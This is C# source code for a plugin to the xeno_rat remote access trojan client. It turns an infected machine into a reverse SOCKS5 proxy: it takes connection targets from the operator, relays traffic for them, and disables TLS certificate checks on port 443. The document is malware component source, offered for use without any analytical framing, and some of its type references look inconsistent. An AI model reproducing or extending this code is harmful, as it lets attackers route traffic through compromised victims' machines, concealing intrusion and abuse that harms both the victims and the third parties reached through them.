using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node)
        {
            // Indicate reverse proxy connection
            await node.SendAsync(new byte[] { 3 });

            while (node.Connected())
            {
                try
                {
                    // Receive node ID (length-prefixed)
                    byte[] idBytes = await node.ReceiveAsync();
                    if (idBytes == null) break;

                    int nodeId = Node2.BytesToInt(idBytes);

                    // Find or create subnode
                    Node tempNode = node.Parent?.subNodes?.FirstOrDefault(n => n.SetId == nodeId);
                    if (tempNode == null)
                    {
                        await node.SendAsync(new byte[] { 0 }); // failed
                        continue;
                    }

                    await node.SendAsync(new byte[] { 1 }); // OK
                    node.AddSubNode(tempNode);

                    var handler = new Socks5Handler(tempNode);
                    _ = handler.StartAsync(); // fire-and-forget
                }
                catch
                {
                    break;
                }
            }

            node.Disconnect();
        }
    }

    public class Socks5Handler
    {
        private Node subnode;

        public Socks5Handler(Node subnode)
        {
            this.subnode = subnode;
        }

        public async Task StartAsync()
        {
            try
            {
                // Receive destination info (length-prefixed)
                byte[] destAddrBytes = await subnode.ReceiveAsync();
                byte[] portBytes = await subnode.ReceiveAsync();
                byte[] timeoutBytes = await subnode.ReceiveAsync();

                if (destAddrBytes == null || portBytes == null || timeoutBytes == null)
                {
                    subnode.Disconnect();
                    return;
                }

                string destAddr = Encoding.UTF8.GetString(destAddrBytes);
                int destPort = Node2.BytesToInt(portBytes);
                int timeout = Node2.BytesToInt(timeoutBytes);

                TcpClient remoteClient = new TcpClient
                {
                    ReceiveTimeout = timeout,
                    SendTimeout = timeout
                };

                try
                {
                    await remoteClient.ConnectAsync(destAddr, destPort);
                }
                catch
                {
                    // Send failure code back
                    await subnode.SendAsync(new byte[] { 4 });
                    subnode.Disconnect();
                    return;
                }

                // Send OK
                await subnode.SendAsync(new byte[] { 1 });

                // Optional: TLS for HTTPS
                Stream remoteStream = remoteClient.GetStream();
                if (destPort == 443)
                {
                    var ssl = new SslStream(remoteStream, false, (sender, cert, chain, errs) => true);
                    await ssl.AuthenticateAsClientAsync(destAddr);
                    remoteStream = ssl;
                }

                // Start bidirectional relay
                await RelayLoop(remoteStream, subnode);

                remoteClient.Close();
                subnode.Disconnect();
            }
            catch
            {
                subnode.Disconnect();
            }
        }

        private async Task RelayLoop(Stream remoteStream, Node subnode)
        {
            var buffer = new byte[4096];

            while (subnode.Connected())
            {
                var readRemoteTask = remoteStream.ReadAsync(buffer, 0, buffer.Length);
                var readNodeTask = subnode.ReceiveAsync();

                var completed = await Task.WhenAny(readRemoteTask, readNodeTask);

                if (completed == readRemoteTask)
                {
                    int bytesRead = readRemoteTask.Result;
                    if (bytesRead == 0) break;
                    await subnode.SendAsync(buffer.Take(bytesRead).ToArray());
                }
                else
                {
                    byte[] data = await readNodeTask;
                    if (data == null || data.Length == 0) break;
                    await remoteStream.WriteAsync(data, 0, data.Length);
                    await remoteStream.FlushAsync();
                }
            }
        }
    }

    // --- Node helper methods ---
    public partial class Node2
    {
        public Socket sock;
        public Node Parent;
        public int SetId;
        public System.Collections.Generic.List<Node> subNodes = new System.Collections.Generic.List<Node>();

        public bool Connected() => sock != null && sock.Connected;

        public async Task SendAsync(byte[] data)
        {
            if (sock == null || !sock.Connected) return;

            byte[] lenPrefix = BitConverter.GetBytes(data.Length);
            if (BitConverter.IsLittleEndian) Array.Reverse(lenPrefix);

            byte[] sendBuffer = new byte[lenPrefix.Length + data.Length];
            Array.Copy(lenPrefix, 0, sendBuffer, 0, lenPrefix.Length);
            Array.Copy(data, 0, sendBuffer, lenPrefix.Length, data.Length);

            int sent = 0;
            while (sent < sendBuffer.Length)
            {
                int n = await sock.SendAsync(new ArraySegment<byte>(sendBuffer, sent, sendBuffer.Length - sent), SocketFlags.None);
                if (n == 0) throw new SocketException();
                sent += n;
            }
        }

        public async Task<byte[]> ReceiveAsync()
        {
            try
            {
                byte[] lenBuf = new byte[4];
                int r = await sock.ReceiveAsync(new ArraySegment<byte>(lenBuf), SocketFlags.None);
                if (r != 4) return null;
                if (BitConverter.IsLittleEndian) Array.Reverse(lenBuf);
                int len = BitConverter.ToInt32(lenBuf, 0);

                byte[] data = new byte[len];
                int received = 0;
                while (received < len)
                {
                    r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, len - received), SocketFlags.None);
                    if (r == 0) return null;
                    received += r;
                }

                return data;
            }
            catch { return null; }
        }

        public void Disconnect()
        {
            try
            {
                sock?.Shutdown(SocketShutdown.Both);
                sock?.Close();
                sock = null;
            }
            catch { }
        }

        public static byte[] IntToBytes(int val)
        {
            byte[] b = BitConverter.GetBytes(val);
            if (BitConverter.IsLittleEndian) Array.Reverse(b);
            return b;
        }

        public static int BytesToInt(byte[] bytes)
        {
            if (bytes.Length == 2) { if (BitConverter.IsLittleEndian) Array.Reverse(bytes); return BitConverter.ToUInt16(bytes, 0); }
            if (bytes.Length == 4) { if (BitConverter.IsLittleEndian) Array.Reverse(bytes); return BitConverter.ToInt32(bytes, 0); }
            throw new ArgumentException("Invalid byte array length");
        }

        public void AddSubNode(Node n)
        {
            if (!subNodes.Contains(n)) subNodes.Add(n);
        }
    }
}